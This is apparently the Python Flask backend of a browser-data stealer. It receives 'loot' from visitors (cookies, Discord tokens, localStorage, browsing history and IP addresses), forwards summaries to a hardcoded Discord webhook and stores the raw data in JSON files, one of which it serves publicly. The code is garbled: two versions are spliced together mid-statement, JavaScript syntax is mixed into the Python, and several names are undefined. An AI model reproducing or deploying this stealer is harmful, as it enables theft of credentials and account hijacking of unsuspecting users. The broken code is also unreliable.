from flask import Flask, request, send_file
from flask_cors import CORS
import json
import requests
from datetime import datetime
import base64
import logging
import os

app = Flask(__name__)
CORS(app)  # Fix CORS

# YOUR WEBHOOK
WEBHOOK_URL = "https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER"
LOOT_FILE = 'full_loot.json'

def send_webhook(loot):
    ip = loot.get('ip', request.remote_addr)
    
    embed = {
        "title": "🕷️ AUTO-LOOT DELIVERED",
        "color": 16711680,
        "fields": [
            {"name": "🌐 IP", "value": f"`{ip}`", "inline": true},
            {"name": "🍪 Cookies", "value": f"`{len(loot.get('cookies', ''))}` chars", "inline": true},
            {"name": "💎 Tokens", "value": f"`{Object.keys(loot.get('discordTokens', {})).length}`", "inline": true},
            {"name": "📦 Storage", "value": f"`{Object.keys(loot.get('localStorage', {})).length}` keys", "inline": true},
            {"name": "📜 History", "value": f"`{loot.get('history', []).length}` Discord pages", "inline": true}
        ],
        "footer": {"text": loot['timestamp'][:19]},
        "thumbnail": {"url": "https://discord.com/assets/f9c9114725d6e2712627b838ad26a9c9.svg"}
    }
    
    requests.post(WEBHOOK_URL, json={"username": "AutoLoot", "embeds": [embed]})

@app.route('/', methods=['GET', 'POST'])
def index():
    return send_file('index.html')

@app.route('/harvest', methods=['POST'])
def harvest():
    loot = request.get_json() or {}
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    loot['ip'] = ip
    
    # Send webhook
    send_webhook(loot)
    
    # Save raw
    loot_list = []
    if os.path.exists(LOOT_FILE):
        with open(LOOT_FILE, 'r') as f:
            loot_list = json.load(f)
    loot_list.append(loot)
    with open(LOOT_FILE, 'w') as f:
        json.dump(loot_list, f, indent=2)
    
    return "OK", 200

@app.route('/harvest')
def harvest_get():
    data = request.args.get('data')
    if data:
        loot = json.loads(base64.b64decode(data).decode())
        send_webhook(loot)
    return "OK", 200

# Static serving
@app.route('/<path:path>')
def static_files(path):
    try:
        return send_file(path)
    except:
        return send_file('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)        "footer": {"text": f"{loot['timestamp'][:19]} | UA: {loot['user_agent'][:40]}..."},
        "thumbnail": {"url": "https://discord.com/assets/f9c9114725d6e2712627b838ad26a9c9.svg"}
    }
    
    payload = {"embeds": [embed], "username": "Browser Loot Bot"}
    
    try:
        response = requests.post(WEBHOOK_URL, json=payload, timeout=5)
        logger.info(f"✅ Webhook delivered: {loot['ip']}")
    except Exception as e:
        logger.error(f"❌ Webhook failed: {e}")

def save_loot(loot):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr.split(',')[0].strip())
    location = get_ip_info(ip)
    
    full_loot = {
        **loot,
        'ip': ip,
        'location': location,
        'user_agent': loot.get('fingerprint', {}).get('userAgent', 'Unknown'),
        'timestamp': datetime.now().isoformat()
    }
    
    # Send to webhook
    send_to_webhook(full_loot)
    
    # Save full raw data locally
    if os.path.exists(CREDS_FILE):
        with open(CREDS_FILE, 'r') as f:
            existing = json.load(f)
    else:
        existing = []
    
    existing.append(full_loot)
    with open(CREDS_FILE, 'w') as f:
        json.dump(existing, f, indent=2)
    
    logger.info(f"🕷️ LOOT: {ip} - {len(loot.get('cookies', ''))} cookie chars + tokens")

@app.route('/')
def index():
    with open('index.html') as f:
        return f.read()

@app.route('/loot', methods=['POST'])
def loot():
    loot_data = request.get_json()
    save_loot(loot_data)
    return jsonify({'success': True})

@app.route('/loot.json')
def get_loot():
    if os.path.exists(CREDS_FILE):
        with open(CREDS_FILE, 'r') as f:
            return f.read()
    return "No loot yet."

# Static files
@app.route('/style.css')
def css(): return open('style.css').read()
@app.route('/script.js')
def js(): return open('script.js').read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
